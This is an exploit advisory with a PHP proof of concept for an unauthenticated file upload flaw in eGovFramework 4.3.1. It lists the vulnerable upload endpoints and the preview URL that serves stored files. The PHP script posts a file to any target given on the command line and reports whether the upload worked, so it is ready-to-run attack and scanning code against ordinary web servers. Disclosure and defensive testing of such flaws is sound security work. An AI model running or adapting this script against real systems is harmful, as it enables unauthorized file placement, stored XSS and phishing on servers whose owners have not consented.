@@ -1,0 +1,129 @@
+=============================================================================================================================================
+| # Title     : eGovFramework 4.3.1 Unauthenticated File Upload Allowing Arbitrary File Storage                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://egovframe.go.kr/eng/ntt/nttRead.do?menuNo=21&bbsId=101&nttId=1871                                                   |
+=============================================================================================================================================
+
+POC :
+
+[+] Pre-Auth File Upload Vulnerability in eGovFramework 4.3.1 (CVE-2025-34336)
+
+[+] A pre-authenticated arbitrary file upload vulnerability exists in
+    EgovFrame web applications. The affected upload handlers allow remote
+    unauthenticated users to upload files without proper validation,
+    leading to arbitrary file storage on the server.
+
+[+] This issue can be exploited to place attacker-controlled files into
+    the server filesystem, resulting in access to stored files via the public image preview endpoint.
+
+[+] Vulnerable Endpoints:
+    ---------------------
+   /utl/wed/insertImage.do
+   /utl/wed/insertImageCk.do
+
+[+] Impact:
+    -------
+    An attacker can upload arbitrary files (TXT, HTML, JSON, images, etc.)
+    without authentication. While code execution is not possible due to
+    server-side restrictions, successful upload is enough to confirm the
+    vulnerability and may lead to stored XSS, phishing, or information 
+    leakage depending on server configuration.
+
+[+] PoC (Safe Non-Malicious Upload):
+    --------------------------------
+    The following PHP proof-of-concept demonstrates a harmless TXT file
+    upload to confirm the vulnerability.
+
+[+] Exploitation / How To Run The PoC
+    ---------------------------------
+
+   1. Save the PoC as: poc.php
+
+   2. Open a terminal or command prompt and run: php poc.php https://target-website.com/
+
+   3. If the server is vulnerable, the script will return:
+   
+[+] Potential Vulnerability Detected!
+
+   along with a JSON response containing "path" and "physical".
+
+   4. If these fields exist, the upload succeeded and the target is affectedby CVE-2025-34336.
+
+[+] This PoC is safe, non-malicious, and uploads only a TXT file used for proof-of-vulnerability purposes.
+
+====================================================================
+
+[+] PayLoad :
+
+<?php
+
+if ($argc < 2) {
+    echo "Usage: php poc.php https://target\n";
+    exit;
+}
+
+$base = rtrim($argv[1], "/");
+
+$endpoints = [
+    "/utl/wed/insertImage.do",
+    "/utl/wed/insertImageCk.do"
+];
+
+$proof = "proof.txt";
+file_put_contents($proof, "This is a harmless proof-of-vulnerability file.");
+
+foreach ($endpoints as $ep) {
+
+    $url = $base . $ep;
+
+    echo "\n========================================\n";
+    echo "[*] Testing: $url\n";
+
+    $post = [
+        "uploadfile" => new CURLFile($proof, "text/plain", "proof.txt")
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+    $response = curl_exec($ch);
+    $code     = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    echo "[HTTP $code] Response length: " . strlen($response) . "\n";
+
+    if ($code == 200 && strpos($response, "path") !== false && strpos($response, "physical") !== false) {
+        echo "[+] Potential Vulnerability Detected!\n";
+        echo "[+] Raw JSON Response:\n$response\n";
+    } else {
+        echo "[-] Not Vulnerable or WAF blocked.\n";
+    }
+}
+
+echo "\nDone.\n";
+
+?>
+
+[+] Accessing Uploaded Files:
+    -------------------------
+   Uploaded files can be accessed via:
+
+   /utl/web/imageSrc.do?path=ENC(...)&physical=ENC(...)&contentType=ENC(...)
+
+[+] Vendor Status:
+    --------------
+    No official patch available at the time of disclosure.
+
+[+] Recommendation:
+    ---------------
+   Do not expose EgovFrame-based applications directly to the internet.
+   Implement strict file validation and disable unauthenticated upload
+   handlers.
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
